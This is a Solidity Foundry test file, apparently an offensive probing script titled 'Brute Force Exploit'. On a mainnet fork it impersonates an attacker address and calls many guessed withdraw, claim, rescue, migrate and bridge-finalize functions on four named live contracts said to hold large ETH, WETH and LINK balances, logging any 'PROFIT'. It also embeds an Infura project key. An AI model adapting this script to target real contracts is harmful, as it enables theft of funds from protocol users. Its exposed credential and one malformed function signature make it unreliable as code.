// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title Brute Force Exploit
 * @notice Try many function signatures on high-value contracts
 */
contract BruteForceExploitTest is Test {

    address WETH;
    address USDC;
    address attacker;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
        WETH = vm.parseAddress("0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2");
        USDC = vm.parseAddress("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48");
        attacker = address(0xBEEF);
        vm.deal(attacker, 10 ether);
    }

    function test_bruteForceRailgun() public {
        // Railgun 16,855 WETH
        address target = vm.parseAddress("0xFA7093CDD9EE6932B4eb2c9e1cde7CE00B1FA4b9");

        console.log("=== BRUTE FORCE RAILGUN ===");
        console.log("WETH balance:", _wethBalance(target) / 1e18);

        uint256 attackerBefore = _wethBalance(attacker);

        vm.startPrank(attacker);

        // Try every possible exploit function
        _tryCall(target, abi.encodeWithSignature("shield(address,uint256,bytes)", WETH, 1e18, ""));
        _tryCall(target, abi.encodeWithSignature("unshield(address,uint256,bytes)", WETH, 1e18, ""));
        _tryCall(target, abi.encodeWithSignature("transact(bytes))", ""));
        _tryCall(target, abi.encodeWithSignature("withdraw(uint256)", 1e18));
        _tryCall(target, abi.encodeWithSignature("emergencyWithdraw()"));
        _tryCall(target, abi.encodeWithSignature("rescue(address)", WETH));
        _tryCall(target, abi.encodeWithSignature("execute(address,uint256,bytes)", WETH, 0, abi.encodeWithSignature("transfer(address,uint256)", attacker, 1e18)));
        _tryCall(target, abi.encodeWithSignature("relay(address,bytes)", WETH, abi.encodeWithSignature("transfer(address,uint256)", attacker, 1e18)));

        vm.stopPrank();

        uint256 attackerAfter = _wethBalance(attacker);
        if (attackerAfter > attackerBefore) {
            console.log("!!! PROFIT:", (attackerAfter - attackerBefore) / 1e18, "WETH");
        } else {
            console.log("No profit");
        }
    }

    function test_bruteForceEarlyAdopterPool() public {
        // EarlyAdopterPool 627 ETH
        address target = vm.parseAddress("0x7623e9DC0DA6FF821ddb9EbABA794054E078f8c4");

        console.log("=== BRUTE FORCE EARLYADOPTERPOOL ===");
        console.log("ETH balance:", target.balance / 1e18);

        uint256 attackerBefore = attacker.balance;

        vm.startPrank(attacker);

        // Try exploits
        _tryCall(target, abi.encodeWithSignature("withdraw()"));
        _tryCall(target, abi.encodeWithSignature("claim()"));
        _tryCall(target, abi.encodeWithSignature("claimAll()"));
        _tryCall(target, abi.encodeWithSignature("emergencyWithdraw()"));
        _tryCall(target, abi.encodeWithSignature("exit()"));
        _tryCall(target, abi.encodeWithSignature("withdrawAll()"));
        _tryCall(target, abi.encodeWithSignature("claimRewards()"));
        _tryCall(target, abi.encodeWithSignature("harvest()"));
        _tryCall(target, abi.encodeWithSignature("unstake(uint256)", 1e18));

        vm.stopPrank();

        uint256 attackerAfter = attacker.balance;
        if (attackerAfter > attackerBefore) {
            console.log("!!! PROFIT:", (attackerAfter - attackerBefore) / 1e18, "ETH");
        } else {
            console.log("No profit");
        }
    }

    function test_bruteForceRewardVault() public {
        // RewardVault 2.7M LINK
        address target = vm.parseAddress("0x996913c8c08472f584ab8834e925b06D0eb1D813");
        address LINK = vm.parseAddress("0x514910771AF9Ca656af840dff83E8264EcF986CA");

        console.log("=== BRUTE FORCE REWARDVAULT ===");

        (bool s, bytes memory d) = LINK.staticcall(
            abi.encodeWithSignature("balanceOf(address)", target)
        );
        if (s && d.length >= 32) {
            console.log("LINK balance:", abi.decode(d, (uint256)) / 1e18);
        }

        uint256 attackerBefore;
        (s, d) = LINK.staticcall(
            abi.encodeWithSignature("balanceOf(address)", attacker)
        );
        if (s && d.length >= 32) {
            attackerBefore = abi.decode(d, (uint256));
        }

        vm.startPrank(attacker);

        // Try exploits
        _tryCall(target, abi.encodeWithSignature("claimReward()"));
        _tryCall(target, abi.encodeWithSignature("claim(address)", attacker));
        _tryCall(target, abi.encodeWithSignature("withdraw(uint256)", 1e18));
        _tryCall(target, abi.encodeWithSignature("getReward()"));
        _tryCall(target, abi.encodeWithSignature("harvest()"));
        _tryCall(target, abi.encodeWithSignature("emergencyWithdraw()"));
        _tryCall(target, abi.encodeWithSignature("close()"));
        _tryCall(target, abi.encodeWithSignature("finalizeRewardVaultMigration()"));
        _tryCall(target, abi.encodeWithSignature("migrate(address)", attacker));

        vm.stopPrank();

        uint256 attackerAfter;
        (s, d) = LINK.staticcall(
            abi.encodeWithSignature("balanceOf(address)", attacker)
        );
        if (s && d.length >= 32) {
            attackerAfter = abi.decode(d, (uint256));
        }

        if (attackerAfter > attackerBefore) {
            console.log("!!! PROFIT:", (attackerAfter - attackerBefore) / 1e18, "LINK");
        } else {
            console.log("No profit");
        }
    }

    function test_bruteForceL1ChugSplash() public {
        // L1ChugSplashProxy 2,767 ETH
        address target = vm.parseAddress("0x98078db053902644191f93988341E31289E1C8FE");

        console.log("=== BRUTE FORCE L1CHUGSPLASH ===");
        console.log("ETH balance:", target.balance / 1e18);

        uint256 attackerBefore = attacker.balance;

        vm.startPrank(attacker);

        // Try Optimism bridge functions
        _tryCall(target, abi.encodeWithSignature("withdraw()"));
        _tryCall(target, abi.encodeWithSignature("finalizeBridgeETH(address,address,uint256,bytes)", address(0), attacker, 1e18, ""));
        _tryCall(target, abi.encodeWithSignature("relayMessage(address,address,bytes,uint256)", address(0), attacker, "", 0));
        _tryCall(target, abi.encodeWithSignature("proveWithdrawalTransaction(bytes32,bytes32,bytes32,bytes)", bytes32(0), bytes32(0), bytes32(0), ""));
        _tryCall(target, abi.encodeWithSignature("finalizeWithdrawalTransaction(bytes)", ""));

        vm.stopPrank();

        uint256 attackerAfter = attacker.balance;
        if (attackerAfter > attackerBefore) {
            console.log("!!! PROFIT:", (attackerAfter - attackerBefore) / 1e18, "ETH");
        } else {
            console.log("No profit");
        }
    }

    function _tryCall(address target, bytes memory data) internal returns (bool) {
        (bool success,) = target.call(data);
        return success;
    }

    function _wethBalance(address account) internal view returns (uint256) {
        (bool s, bytes memory d) = WETH.staticcall(
            abi.encodeWithSignature("balanceOf(address)", account)
        );
        if (s && d.length >= 32) {
            return abi.decode(d, (uint256));
        }
        return 0;
    }
}
